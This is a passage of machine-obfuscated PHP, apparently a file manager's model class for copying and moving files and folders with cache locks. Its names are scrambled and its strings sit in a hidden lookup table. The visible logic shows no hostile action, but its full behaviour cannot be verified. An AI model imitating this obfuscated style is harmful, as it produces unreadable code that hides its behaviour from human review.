<?php
 goto dà·í‹„øß; b­Æ×…àÎÁ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($‰ÇÑ×¡À) { $³ÒÍúà =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($³ÒÍúà[618], $‰ÇÑ×¡À); $ÇÚµ„´î = 1; $this->_lockEvent($‰ÇÑ×¡À, array($³ÒÍúà[619], $³ÒÍúà[620]), $ÇÚµ„´î); $this->_lockParent($‰ÇÑ×¡À, array($³ÒÍúà[620]), $ÇÚµ„´î); $this->_lockEvent($‰ÇÑ×¡À, array($³ÒÍúà[621], $³ÒÍúà[622]), $ÇÚµ„´î); $this->_lockCheckEnd($³ÒÍúà[618], $‰ÇÑ×¡À); } public function lockCopyEnd($Ş¸µ»è£) { $†›ûß™Â =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $óµ³»”¼ = 0; $this->_lockEvent($Ş¸µ»è£, array($†›ûß™Â[619], $†›ûß™Â[620]), $óµ³»”¼); $this->_lockParent($Ş¸µ»è£, array($†›ûß™Â[620]), $óµ³»”¼); $this->_lockEvent($Ş¸µ»è£, array($†›ûß™Â[621], $†›ûß™Â[622]), $óµ³»”¼); } public function lockWriteStart($ªÙôÃÌ¿, $È›ÕÇÜ© = '') { $’ëØ¨ŸÍ =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($’ëØ¨ŸÍ[619], $ªÙôÃÌ¿); $š³·ÅÒ¤ = 1; $this->_lockKey($’ëØ¨ŸÍ[623] . $ªÙôÃÌ¿ . $’ëØ¨ŸÍ[10] . $È›ÕÇÜ©, $š³·ÅÒ¤); $this->_lockEvent($ªÙôÃÌ¿, array($’ëØ¨ŸÍ[618], $’ëØ¨ŸÍ[620]), $š³·ÅÒ¤); $this->_lockParent($ªÙôÃÌ¿, array($’ëØ¨ŸÍ[618], $’ëØ¨ŸÍ[620]), $š³·ÅÒ¤); $this->_lockCheckEnd($’ëØ¨ŸÍ[619], $ªÙôÃÌ¿); } public function lockWriteEnd($ŒÓòßˆ, $«®äá½è = '') { $®—Ğúº  =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $®ÙŒ¤Ç = 0; $this->_lockKey($®—Ğúº [623] . $ŒÓòßˆ . $®—Ğúº [10] . $«®äá½è, $®ÙŒ¤Ç); $this->_lockEvent($ŒÓòßˆ, array($®—Ğúº [618], $®—Ğúº [620]), $®ÙŒ¤Ç); $this->_lockParent($ŒÓòßˆ, array($®—Ğúº [618], $®—Ğúº [620]), $®ÙŒ¤Ç); } public function lockMoveStart($Ù³Èúê§) { $Å•îØ =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($Å•îØ[620], $Ù³Èúê§); $ÍÛùÀ…” = 1; $this->_lockKey($Å•îØ[624] . $Ù³Èúê§, $ÍÛùÀ…”); $this->_lockEvent($Ù³Èúê§, array($Å•îØ[618], $Å•îØ[619]), $ÍÛùÀ…”); $this->_lockParent($Ù³Èúê§, array($Å•îØ[618], $Å•îØ[620]), $ÍÛùÀ…”); $this->_lockEvent($Ù³Èúê§, array($Å•îØ[625], $Å•îØ[621], $Å•îØ[622]), $ÍÛùÀ…”); $this->_lockCheckEnd($Å•îØ[620], $Ù³Èúê§); } public function lockMoveEnd($ôÛûúŠı) { $©‘Ñ›¤ö =& $_SERVER[óÔë„ú]; if (!$this->allowLock()) { return; } $™ƒÕÑ§ƒ = 0; $this->_lockKey($©‘Ñ›¤ö[624] . $ôÛûúŠı, $™ƒÕÑ§ƒ); $this->_lockEvent($ôÛûúŠı, array($©‘Ñ›¤ö[618], $©‘Ñ›¤ö[619]), $™ƒÕÑ§ƒ); $this->_lockParent($ôÛûúŠı, array($©‘Ñ›¤ö[618], $©‘Ñ›¤ö[620]), $™ƒÕÑ§ƒ); $this->_lockEvent($ôÛûúŠı, array($©‘Ñ›¤ö[625], $©‘Ñ›¤ö[621], $©‘Ñ›¤ö[622]), $™ƒÕÑ§ƒ); } private function _lockCheck($½óÁ½¾Á, $­¤áëâñ) { $ØİÙ· =& $_SERVER[óÔë„ú]; $®§ËşõŞ = $this->sourceInfo($­¤áëâñ); $Öı´Ó‰’ = $½óÁ½¾Á . $ØİÙ·[10] . $­¤áëâñ; $this->_lockTimeStart[$Öı´Ó‰’] = timeFloat(); if (!is_array($®§ËşõŞ)) { return; } $ÚâÈÄ†Ù = LNG($ØİÙ·[626]); CacheLock::setErrorMsg($ØİÙ·[176] . htmlspecialchars($®§ËşõŞ[$ØİÙ·[32]]) . $ØİÙ·[178] . $ÚâÈÄ†Ù); $this->_lockKey($Öı´Ó‰’, 1); $this->_lockKey($Öı´Ó‰’, 0); $š™­ö§’ = array_reverse($this->parentLevelArray($®§ËşõŞ[$ØİÙ·[584]])); foreach ($š™­ö§’ as $ÊŠ­éª) { $Öı´Ó‰’ = $½óÁ½¾Á . $ØİÙ·[627] . $ÊŠ­éª; if (CacheLock::lockGet($ØİÙ·[628] . $Öı´Ó‰’)) { $®§ËşõŞ = $this->sourceInfo($ÊŠ­éª); CacheLock::setErrorMsg($ØİÙ·[176] . htmlspecialchars($®§ËşõŞ[$ØİÙ·[32]]) . $ØİÙ·[178] . $ÚâÈÄ†Ù); $this->_lockKey($Öı´Ó‰’, 1); $this->_lockKey($Öı´Ó‰’, 0); } } } private function _lockCheckEnd($©Š»’ª‚, $ß«Øğíã) { $÷›Á¹¬ä =& $_SERVER[óÔë„ú]; $¹Ã¢ôÔà = $©Š»’ª‚ . $÷›Á¹¬ä[10] . $ß«Øğíã; CacheLock::setErrorMsg($÷›Á¹¬ä[454]); if (!isset($this->_lockTimeStart[$¹Ã¢ôÔà])) { return; } $Å»ğš¹ = timeFloat() - $this->_lockTimeStart[$¹Ã¢ôÔà]; unset($this->_lockTimeStart[$¹Ã¢ôÔà]); if ($Å»ğš¹ > 0.5) { unset(self::$cacheSourceInfo[$÷›Á¹¬ä[533] . $ß«Øğíã]); } $±ˆÅÇ¸ˆ = $this->sourceInfo($ß«Øğíã); if (!$±ˆÅÇ¸ˆ) { show_json(LNG($÷›Á¹¬ä[108]), !1); } } private function _lockParent($ÈÆ²şùõ, $Ê½¨´Ç, $ö«ÀÅ†¾) { if (!$this->autoLockSet) { return; } $Ñ‹…êú = $this->sourceInfo($ÈÆ²şùõ); if (!is_array($Ñ‹…êú)) { return; } $²º«ÚË€ = array_reverse($this->parentLevelArray($Ñ‹…êú[$_SERVER[óÔë„ú][584]])); foreach ($²º«ÚË€ as $µÒƒàÜÕ) { $this->_lockEvent($µÒƒàÜÕ, $Ê½¨´Ç, $ö«ÀÅ†¾); } } private function _lockEvent($¦ŠÖ‡³š, $ïÔÂ»Ç, $†ß×ß€) { $µ¸øÃı« =& $_SERVER[óÔë„ú]; if (!$this->autoLockSet) { return; } foreach ($ïÔÂ»Ç as $èı’Ô„“) { $‡çÍş¬ = $èı’Ô„“ . $µ¸øÃı«[10] . $¦ŠÖ‡³š; if ($†ß×ß€ && CacheLock::lockGet($µ¸øÃı«[628] . $‡çÍş¬)) { continue; } $this->_lockKey($‡çÍş¬, $†ß×ß€); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÎÇÉ”Ğ¤, $µŸ–ŸÑÓ = 1) { $³šİÈß¼ = $_SERVER[óÔë„ú][628] . md5($ÎÇÉ”Ğ¤); if ($µŸ–ŸÑÓ) { if (isset(self::$_lockItemArr[$³šİÈß¼])) { return; } self::$_lockItemArr[$³šİÈß¼] = 1; CacheLock::lock($³šİÈß¼, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$³šİÈß¼])) { return; } unset(self::$_lockItemArr[$³šİÈß¼]); CacheLock::unlock($³šİÈß¼); } } public function isParentOf($í¡şÍê±, $ÆŒãÜ¥³) { $ ŠüØƒ¯ =& $_SERVER[óÔë„ú]; $ó±¤ËÛÓ = $this->sourceInfo($í¡şÍê±); $û¥·…Ò¾ = $this->sourceInfo($ÆŒãÜ¥³); $æÅë‹¬õ = $ó±¤ËÛÓ[$ ŠüØƒ¯[584]] . $ó±¤ËÛÓ[$ ŠüØƒ¯[193]] . $ ŠüØƒ¯[50]; $ˆÊğÁØ = $û¥·…Ò¾[$ ŠüØƒ¯[584]] . $û¥·…Ò¾[$ ŠüØƒ¯[193]] . $ ŠüØƒ¯[50]; $ÙÅ‡œ İ = strpos($ˆÊğÁØ, $æÅë‹¬õ) === 0; return $ÙÅ‡œ İ; } private $targetIsDelete = 0; public function copy($îì–„ÇŠ, $˜¹Ú°, $–æëÇÚ = REPEAT_REPLACE, $ñçßí¯Á = '') { $ß¥‘†ğø =& $_SERVER[óÔë„ú]; $ö‚„Ó‹  = $this->sourceInfo($îì–„ÇŠ); $ˆ–²ü = $this->sourceInfo($˜¹Ú°); if (!$ö‚„Ó‹  || !$ˆ–²ü || $ˆ–²ü[$ß¥‘†ğø[485]] != $ß¥‘†ğø[91]) { return !1; } if ($this->isParentOf($îì–„ÇŠ, $˜¹Ú°)) { return !1; } $ª×èø† = $ñçßí¯Á ? $ñçßí¯Á : $ö‚„Ó‹ [$ß¥‘†ğø[32]]; $this->lockCopyStart($îì–„ÇŠ); $this->lockWriteStart($˜¹Ú°, $ª×èø†); $½‹ú‰¬ = array($ß¥‘†ğø[629] => array(), $ß¥‘†ğø[630] => array(), $ß¥‘†ğø[631] => array()); $this->targetIsDelete = intval($ö‚„Ó‹ [$ß¥‘†ğø[505]]); $ÚÁ§Ö± = $this->fileNameExistAuto($˜¹Ú°, $ö‚„Ó‹ ); $ŠØÛç•ü = $this->_copy($îì–„ÇŠ, $˜¹Ú°, $–æëÇÚ, $½‹ú‰¬, !0, $ñçßí¯Á); $this->_childrenListClear(); $this->lockCopyEnd($îì–„ÇŠ); $this->lockWriteEnd($˜¹Ú°, $ª×èø†); if ($ö‚„Ó‹ [$ß¥‘†ğø[485]] == $ß¥‘†ğø[91] && $ÚÁ§Ö± == $ŠØÛç•ü) { $this->folderSizeResetChildren($ÚÁ§Ö±); } Model($ß¥‘†ğø[632])->addAll($½‹ú‰¬[$ß¥‘†ğø[630]], array(), !0); if ($ÚÁ§Ö± != $ŠØÛç•ü || $ö‚„Ó‹ [$ß¥‘†ğø[485]] == $ß¥‘†ğø[91]) { Model($ß¥‘†ğø[633])->eventCopy($ŠØÛç•ü); } $this->saveAll($½‹ú‰¬[$ß¥‘†ğø[631]]); Model($ß¥‘†ğø[230])->linkAdd($½‹ú‰¬[$ß¥‘†ğø[629]]); $this->folderSizeReset($˜¹Ú°); $this->updateModifyTime($˜¹Ú°); return $ŠØÛç•ü; } private function _copy($½Š·Ì¬Ø, $Ç˜Óì„÷, $Ë¹’µçÂ, &$ÒïÃˆ¥¯, $à†˜ĞÖ®, $Œëà§¡˜ = '') { $§Å£äÊÑ =& $_SERVER[óÔë„ú]; $§ÀØ«¡ = $this->sourceInfoCache($½Š·Ì¬Ø); $ÄÉ›¦¨ = $§ÀØ«¡[$§Å£äÊÑ[485]] == $§Å£äÊÑ[91]; $ˆÖ¥øø´ = $Œëà§¡˜ ? $Œëà§¡˜ : $§ÀØ«¡[$§Å£äÊÑ[32]]; $§”‡Øã‚ = $this->fileNameExistAuto($Ç˜Óì„÷, $§ÀØ«¡); if ($à†˜ĞÖ®) { $this->_childrenAllMake($½Š·Ì¬Ø); if ($ÄÉ›¦¨ && $§”‡Øã‚) { $this->_childrenAllMake($§”‡Øã‚); } } if (!$§”‡Øã‚) { return $this->_copyCreate($½Š·Ì¬Ø, $Ç˜Óì„÷, $ˆÖ¥øø´, $ÒïÃˆ¥¯); } $ÆªúŒö = $§”‡Øã‚; if ($ÄÉ›¦¨) { if ($Ë¹’µçÂ == REPEAT_RENAME_FOLDER) { $ˆÖ¥øø´ = $this->fileNameAutoCache($Ç˜Óì„÷, $ˆÖ¥øø´, $Ë¹’µçÂ, $ÄÉ›¦¨); $ÆªúŒö = $this->_copyCreate($½Š·Ì¬Ø, $Ç˜Óì„÷, $ˆÖ¥øø´, $ÒïÃˆ¥¯); } else { $šûŠ¶ËÔ = $this->_childrenList($½Š·Ì¬Ø); foreach ($šûŠ¶ËÔ as $à³ÊòÇÛ) { $this->_copy($à³ÊòÇÛ[$§Å£äÊÑ[193]], $§”‡Øã‚, $Ë¹’µçÂ, $ÒïÃˆ¥¯, !1); } } } else { if ($Ë¹’µçÂ == REPEAT_RENAME || $Ë¹’µçÂ == REPEAT_RENAME_FOLDER) { $ˆÖ¥øø´ = $this->fileNameAutoCache($Ç˜Óì„÷, $ˆÖ¥øø´, $Ë¹’µçÂ, $ÄÉ›¦¨); $ÆªúŒö = $this->_copyCreate($½Š·Ì¬Ø, $Ç˜Óì„÷, $ˆÖ¥øø´, $ÒïÃˆ¥¯); } else { if ($Ë¹’µçÂ == REPEAT_REPLACE) { $®”´Í®Š = $this->sourceInfoCache($§”‡Øã‚); $úé´Ë—á = $this->fileHistory($®”´Í®Š, $§ÀØ«¡[$§Å£äÊÑ[541]], $§ÀØ«¡[$§Å£äÊÑ[79]]); if ($úé´Ë—á) { $ÒïÃˆ¥¯[$§Å£äÊÑ[629]][] = $§ÀØ«¡[$§Å£äÊÑ[541]]; } } else { if ($Ë¹’µçÂ == REPEAT_SKIP) { } } } Hook::trigger($§Å£äÊÑ[634], array($§Å£äÊÑ[635], $§ÀØ«¡, 0)); } return $ÆªúŒö; } private function _copyCreate($„‚²ŠÚ¤, $¬·¶…‹¼, $—œÆ÷ª¤, &$ÈÕ¾Ô§œ) { $ëÖ‰úö =& $_SERVER[óÔë„ú]; $Ô¹ìÉ”ù = $this->sourceInfoCache($„‚²ŠÚ¤); $ï†á‹à— = $this->sourceInfoCache($¬·¶…‹¼); $¨ƒÔã€ = $this->_makeItemData($Ô¹ìÉ”ù, $ï†á‹à—, $—œÆ÷ª¤); Hook::trigger($ëÖ‰úö[636], $¨ƒÔã€); Hook::trigger($ëÖ‰úö[637], array($ëÖ‰úö[638], $¨ƒÔã€, 0)); $µÓ£Î = $this->add($¨ƒÔã€); $¼•î“¸¾ = array($ëÖ‰úö[193] => $µÓ£Î, $ëÖ‰úö[32] => $—œÆ÷ª¤); $this->_copyApplyMeta($¼•î“¸¾, $ÈÕ¾Ô§œ); if ($Ô¹ìÉ”ù[$ëÖ‰úö[485]] != $ëÖ‰úö[91]) { $ÈÕ¾Ô§œ[$ëÖ‰úö[629]][] = $Ô¹ìÉ”ù[$ëÖ‰úö[541]]; return $µÓ£Î; } $Å«Ëñı· = array(); $º¸—À’ì = array(); $this->_childrenListAll($„‚²ŠÚ¤, $Å«Ëñı·); $Öíäî’¹ = count($Å«Ëñı·); if ($Öíäî’¹ == 0) { return $µÓ£Î; } $‰ğ‰Ìû¨ = $this->sourceInfo($µÓ£Î); foreach ($Å«Ëñı· as $€ßË³à‹) { $¤ó‹¥· = $this->_makeItemData($€ßË³à‹, $‰ğ‰Ìû¨, $€ßË³à‹[$ëÖ‰úö[32]]); $¤ó‹¥·[$ëÖ‰úö[584]] = $€ßË³à‹[$ëÖ‰úö[584]]; $º¸—À’ì[] = $¤ó‹¥·; } $this->chunkEventSet($ëÖ‰úö[639], array($ëÖ‰úö[640], $¨ƒÔã€, $Öíäî’¹)); $this->addAll($º¸—À’ì, array(), !1); $—¦£–õƒ = $this->where(array($ëÖ‰úö[192] => $µÓ£Î))->select(); $ÈÅ„Ö˜ô = $this->_childrenMakeRelation($Å«Ëñı·, $—¦£–õƒ); $ÈÅ„Ö˜ô[$„‚²ŠÚ¤] = $µÓ£Î; $ãûëÂ…ü = array(); $›Ãå×ô = array(); foreach ($—¦£–õƒ as $€ßË³à‹) { $Ó…ı© Ë = $€ßË³à‹[$ëÖ‰úö[193]]; $³¸ˆÛ®À = $this->_childrenMatch($ÈÅ„Ö˜ô, $€ßË³à‹, $‰ğ‰Ìû¨); $ãûëÂ…ü[] = array($ëÖ‰úö[193], $Ó…ı© Ë, $ëÖ‰úö[192], $³¸ˆÛ®À[$ëÖ‰úö[192]]); $›Ãå×ô[] = array($ëÖ‰úö[193], $Ó…ı© Ë, $ëÖ‰úö[584], $³¸ˆÛ®À[$ëÖ‰úö[584]]); $this->_copyApplyMeta($€ßË³à‹, $ÈÕ¾Ô§œ); if ($€ßË³à‹[$ëÖ‰úö[485]] != $ëÖ‰úö[91]) { $ÈÕ¾Ô§œ[$ëÖ‰úö[629]][] = $€ßË³à‹[$ëÖ‰úö[541]]; } } $this->chunkEventSet($ëÖ‰úö[641], array($ëÖ‰úö[642], $¨ƒÔã€, $Öíäî’¹)); $this->saveAll($ãûëÂ…ü); $this->chunkEventSet($ëÖ‰úö[643], array($ëÖ‰úö[644], $¨ƒÔã€, $Öíäî’¹)); $this->saveAll($›Ãå×ô); return $µÓ£Î; } private function _childrenMakeRelation($ùØ€íÔ’, $äâªí´) { $ûÛş¤“¼ =& $_SERVER[óÔë„ú]; $—ßæ¶ß = array(); $æ¯‰×•œ = array(); foreach ($ùØ€íÔ’ as $Â¤¸„™) { $“İ§³ö× = $Â¤¸„™[$ûÛş¤“¼[32]] . $ûÛş¤“¼[8] . $Â¤¸„™[$ûÛş¤“¼[584]]; $—ßæ¶ß[$“İ§³ö×] = $Â¤¸„™[$ûÛş¤“¼[193]]; } foreach ($äâªí´ as $Â¤¸„™) { $“İ§³ö× = $Â¤¸„™[$ûÛş¤“¼[32]] . $ûÛş¤“¼[8] . $Â¤¸„™[$ûÛş¤“¼[584]]; $ì¹Óß¨Ô = $—ßæ¶ß[$“İ§³ö×]; $æ¯‰×•œ[$ì¹Óß¨Ô] = $Â¤¸„™[$ûÛş¤“¼[193]]; } return $æ¯‰×•œ; } private function _childrenMatch($ˆ§ïû, $µ’âÎÚ, $ÇÎç¾Î­) { $ÆÀ›’èó =& $_SERVER[óÔë„ú]; $‡Øæ¹ = $ÇÎç¾Î­[$ÆÀ›’èó[584]]; $ıèı³¡À = $this->parentLevelArray($µ’âÎÚ[$ÆÀ›’èó[584]]); foreach ($ıèı³¡À as $±†ôÔ£) { if (isset($ˆ§ïû[$±†ôÔ£])) { $‡Øæ¹ .= $ˆ§ïû[$±†ôÔ£] . $ÆÀ›’èó[645]; } } $‡Øæ¹ = rtrim($‡Øæ¹, $ÆÀ›’èó[50]) . $ÆÀ›’èó[50]; $Òûµãé† = $this->parentLevelArray($‡Øæ¹); $¨âöº›¨ = $Òûµãé†[count($Òûµãé†) - 1]; return array($ÆÀ›’èó[192] => $¨âöº›¨, $ÆÀ›’èó[584] => $‡Øæ¹); } private function _makeItemData($ã©ÏÆï, $†¯¯Œ®È, $Íâ‹°ıà) { $ÅÛôŠÇ† =& $_SERVER[óÔë„ú]; $¥ŸÏÍò = array($ÅÛôŠÇ†[646] => $ã©ÏÆï[$ÅÛôŠÇ†[485]], $ÅÛôŠÇ†[494] => $Íâ‹°ıà, $ÅÛôŠÇ†[647] => $ã©ÏÆï[$ÅÛôŠÇ†[486]] ? $ã©ÏÆï[$ÅÛôŠÇ†[486]] : $ÅÛôŠÇ†[12], $ÅÛôŠÇ†[542] => $ã©ÏÆï[$ÅÛôŠÇ†[541]] ? $ã©ÏÆï[$ÅÛôŠÇ†[541]] : 0, $ÅÛôŠÇ†[617] => $ã©ÏÆï[$ÅÛôŠÇ†[79]] ? $ã©ÏÆï[$ÅÛôŠÇ†[79]] : 0, $ÅÛôŠÇ†[648] => intval($†¯¯Œ®È[$ÅÛôŠÇ†[190]]), $ÅÛôŠÇ†[649] => intval($†¯¯Œ®È[$ÅÛôŠÇ†[569]]), $ÅÛôŠÇ†[650] => intval(USER_ID), $ÅÛôŠÇ†[651] => intval(USER_ID), $ÅÛôŠÇ†[477] => intval($†¯¯Œ®È[$ÅÛôŠÇ†[193]]), $ÅÛôŠÇ†[652] => $†¯¯Œ®È[$ÅÛôŠÇ†[584]] . $†¯¯Œ®È[$ÅÛôŠÇ†[193]] . $ÅÛôŠÇ†[50], $ÅÛôŠÇ†[498] => $ã©ÏÆï[$ÅÛôŠÇ†[88]] ? $ã©ÏÆï[$ÅÛôŠÇ†[88]] : time(), $ÅÛôŠÇ†[504] => 0, $ÅÛôŠÇ†[653] => $ÅÛôŠÇ†[12]); return $¥ŸÏÍò; } private function _copyApplyMeta($øÑ¢ç‚Ä, &$‚ºÆÆ Ÿ) { $ÓÅ—¸ =& $_SERVER[óÔë„ú]; $ŞÍï–Ó× = $øÑ¢ç‚Ä[$ÓÅ—¸[193]]; $ÙÙîªÁƒ = $øÑ¢ç‚Ä[$ÓÅ—¸[32]]; if (!isset($øÑ¢ç‚Ä[$ÓÅ—¸[654]]) || !$øÑ¢ç‚Ä[$ÓÅ—¸[654]] || $øÑ¢ç‚Ä[$ÓÅ—¸[654]] == $ÓÅ—¸[228]) { $‚ºÆÆ Ÿ[$ÓÅ—¸[631]][] = array($ÓÅ—¸[193], $ŞÍï–Ó×, $ÓÅ—¸[654], short_id($ŞÍï–Ó×)); } if (Input::check($ÙÙîªÁƒ, $ÓÅ—¸[655])) { $‚ºÆÆ Ÿ[$ÓÅ—¸[630]][] = array($ÓÅ—¸[193] => $ŞÍï–Ó×, $ÓÅ—¸[97] => $ÓÅ—¸[538], $ÓÅ—¸[450] => str_replace($ÓÅ—¸[53], $ÓÅ—¸[12], Pinyin::get($ÙÙîªÁƒ))); $‚ºÆÆ Ÿ[$ÓÅ—¸[630]][] = array($ÓÅ—¸[193] => $ŞÍï–Ó×, $ÓÅ—¸[97] => $ÓÅ—¸[537], $ÓÅ—¸[450] => Pinyin::get($ÙÙîªÁƒ, $ÓÅ—¸[656])); } $‚ºÆÆ Ÿ[$ÓÅ—¸[630]][] = array($ÓÅ—¸[193] => $ŞÍï–Ó×, $ÓÅ—¸[97] => $ÓÅ—¸[517], $ÓÅ—¸[450] => KodSort::makeStr($ÙÙîªÁƒ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($½áØ¾£¥) { $ä‹‹¯„¿ =& $_SERVER[óÔë„ú]; $€È×å¿¬ = $this->sourceInfo($½áØ¾£¥); $¡Š¢¿ùê = $ä‹‹¯„¿[657]; $¤ŒúÍ® = array($ä‹‹¯„¿[584] => array($ä‹‹¯„¿[612], $€È×å¿¬[$ä‹‹¯„¿[584]] . $½áØ¾£¥ . $ä‹‹¯„¿[613]), $ä‹‹¯„¿[505] => $this->targetIsDelete); $£ş¯ïŠœ = $this->field($¡Š¢¿ùê)->where($¤ŒúÍ®)->select(); if (!$£ş¯ïŠœ) { return; } $£ş¯ïŠœ = array_to_keyvalue($£ş¯ïŠœ, $ä‹‹¯„¿[193]); foreach ($£ş¯ïŠœ as $î§•›ÍØ) { $µˆŞ‡ÎÔ = $î§•›ÍØ[$ä‹‹¯„¿[192]]; $½áØ¾£¥ = $î§•›ÍØ[$ä‹‹¯„¿[193]]; if (!isset($this->_childrenListCache[$½áØ¾£¥]) && $î§•›ÍØ[$ä‹‹¯„¿[485]] == $ä‹‹¯„¿[91]) { $this->_childrenListCache[$½áØ¾£¥] = array(); } if (!isset($this->_childrenListCache[$µˆŞ‡ÎÔ])) { $this->_childrenListCache[$µˆŞ‡ÎÔ] = array(); } $this->_childrenListCache[$µˆŞ‡ÎÔ][$½áØ¾£¥] = $î§•›ÍØ; $this->_childrenItemCache[$½áØ¾£¥] = $î§•›ÍØ; } } private function _childrenListAll($äïÏ¿¼æ, &$ÎëÌÅùÑ) { $¿ñ©³ªÓ =& $_SERVER[óÔë„ú]; if (!isset($this->_childrenListCache[$äïÏ¿¼æ])) { return; } $ºûÏá–ù = $this->_childrenListCache[$äïÏ¿¼æ]; foreach ($ºûÏá–ù as $â¶¢ı†‹ => $†­èØûÄ) { $ÎëÌÅùÑ[$â¶¢ı†‹] = $†­èØûÄ; if ($†­èØûÄ[$¿ñ©³ªÓ[485]] == $¿ñ©³ªÓ[91]) { $this->_childrenListAll($â¶¢ı†‹, $ÎëÌÅùÑ); } } } private function sourceInfoCache($íäøà‘½) { if (isset($this->_childrenItemCache[$íäøà‘½])) { return $this->_childrenItemCache[$íäøà‘½]; } return $this->sourceInfo($íäøà‘½); } private function _childrenList($¹›¸ü“…) { if (isset($this->_childrenListCache[$¹›¸ü“…])) { return $this->_childrenListCache[$¹›¸ü“…]; } return $this->_childrenListSelect($¹›¸ü“…); } private function _childrenListSelect($õÒ‹¥Ğ) { $îÑÌŠı‰ =& $_SERVER[óÔë„ú]; $şÆ‡Í‚· = array($îÑÌŠı‰[192] => $õÒ‹¥Ğ, $îÑÌŠı‰[505] => $this->targetIsDelete); $ˆØ¾Ìæ = $this->where($şÆ‡Í‚·)->select(); $ˆØ¾Ìæ = $ˆØ¾Ìæ ? $ˆØ¾Ìæ : array(); $ãËÒÊš = array_to_keyvalue($ˆØ¾Ìæ, $îÑÌŠı‰[193]); $this->_childrenListCache[$õÒ‹¥Ğ] = $ãËÒÊš; foreach ($ãËÒÊš as $õÒ‹¥Ğ => $çáöø¼¶) { $this->_childrenItemCache[$õÒ‹¥Ğ] = $çáöø¼¶; } return $ãËÒÊš; } private function fileNameExistAuto($Æ‡Œêª, $ÁĞøÆ©ß) { $¬ÑÕÑŠğ =& $_SERVER[óÔë„ú]; if ($ÁĞøÆ©ß[$¬ÑÕÑŠğ[505]] == $¬ÑÕÑŠğ[91]) { return $this->fileNameExist($Æ‡Œêª, $ÁĞøÆ©ß[$¬ÑÕÑŠğ[32]]); } return $this->fileNameExistCache($Æ‡Œêª, $ÁĞøÆ©ß[$¬ÑÕÑŠğ[32]]); } private function fileNameExistCache($¦¿“½Û¢, $È÷…á¿“) { $‹ùİö™– =& $_SERVER[óÔë„ú]; $È÷…á¿“ = strtolower($È÷…á¿“); $äÉñ¶¾² = $this->_childrenList($¦¿“½Û¢); foreach ($äÉñ¶¾² as $¿¦±–ôí) { if ($È÷…á¿“ == strtolower($¿¦±–ôí[$‹ùİö™–[32]])) { return $¿¦±–ôí[$‹ùİö™–[193]]; } } return !1; } private function fileNameAutoCache($ÀĞ´öü, $úšè•¤ß, $ Ÿ‘óÔª, $ß„®¥ä) { $ƒÃ‹ÎÄ =& $_SERVER[óÔë„ú]; $‰©’¨”´ = $this->_childrenList($ÀĞ´öü); $”¾æì¤­ = array_to_keyvalue($‰©’¨”´, $ƒÃ‹ÎÄ[12], $ƒÃ‹ÎÄ[32]); return $this->fileNameAutoGet($”¾æì¤­, $úšè•¤ß, $ Ÿ‘óÔª, $ß„®¥ä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ë´×Î­ø, $§ÁÙÉ½â, $ğŒõ€ñ = REPEAT_REPLACE, $ü¿’âëÊ = '') { $ï¬¶¥¤É =& $_SERVER[óÔë„ú]; $¯À©šË× = $this->sourceInfo($Ë´×Î­ø); $Ú¨ï†û¯ = $this->sourceInfo($§ÁÙÉ½â); if ($¯À©šË×[$ï¬¶¥¤É[192]] == $Ú¨ï†û¯[$ï¬¶¥¤É[193]]) { if ($¯À©šË×[$ï¬¶¥¤É[505]] == $ï¬¶¥¤É[91]) { Model($ï¬¶¥¤É[503])->restore(array($Ë´×Î­ø)); } if (!$ü¿’âëÊ || $ü¿’âëÊ == $¯À©šË×[$ï¬¶¥¤É[32]]) { return $Ë´×Î­ø; } } $æé›û§û = $this->pathInfoMore($Ë´×Î­ø); if ($this->isParentOf($Ë´×Î­ø, $§ÁÙÉ½â)) { return !1; } if (!$¯À©šË× || !$Ú¨ï†û¯ || $Ú¨ï†û¯[$ï¬¶¥¤É[485]] != $ï¬¶¥¤É[91]) { return !1; } Hook::trigger($ï¬¶¥¤É[658], $æé›û§û); $this->targetIsDelete = intval($¯À©šË×[$ï¬¶¥¤É[505]]); if ($¯À©šË×[$ï¬¶¥¤É[192]] == $§ÁÙÉ½â && $ü¿’âëÊ != $¯À©šË×[$ï¬¶¥¤É[32]]) { $ªŞøË¯µ = $this->fileNameExist($§ÁÙÉ½â, $ü¿’âëÊ); if ($ªŞøË¯µ && $¯À©šË×[$ï¬¶¥¤É[485]] == $ï¬¶¥¤É[228]) { $°€†Ûû© = $this->sourceInfo($ªŞøË¯µ); $éï÷Ç± = $this->fileHistory($°€†Ûû©, $¯À©šË×[$ï¬¶¥¤É[541]], $¯À©šË×[$ï¬¶¥¤É[79]]); if (!$éï÷Ç±) { Model($ï¬¶¥¤É[544])->remove($¯À©šË×[$ï¬¶¥¤É[541]]); } $this->removeNow($Ë´×Î­ø, !1); $this->folderSizeReset($§ÁÙÉ½â); Hook::trigger($ï¬¶¥¤É[659], $æé›û§û); return $ªŞøË¯µ; } } $£ÆçìŒ¶ = $ü¿’âëÊ ? $ü¿’âëÊ : $¯À©šË×[$ï¬¶¥¤É[32]]; $this->lockMoveStart($Ë´×Î­ø); $this->lockWriteStart($§ÁÙÉ½â, $£ÆçìŒ¶); $ş°üÉ¢™ = array($ï¬¶¥¤É[629] => array(), $ï¬¶¥¤É[660] => !1); $this->clearShare($Ë´×Î­ø, $§ÁÙÉ½â); $©ÀˆİŸò = $this->fileNameExistAuto($§ÁÙÉ½â, $¯À©šË×); $ÚÃî‰ïË = $this->_move($Ë´×Î­ø, $§ÁÙÉ½â, $ğŒõ€ñ, $ş°üÉ¢™, $ü¿’âëÊ); $this->sourceCacheClear(); if ($¯À©šË×[$ï¬¶¥¤É[485]] == $ï¬¶¥¤É[91] && $©ÀˆİŸò) { $this->folderSizeResetChildren($ÚÃî‰ïË); } Model($ï¬¶¥¤É[230])->linkAdd($ş°üÉ¢™[$ï¬¶¥¤É[629]]); if ($©ÀˆİŸò && 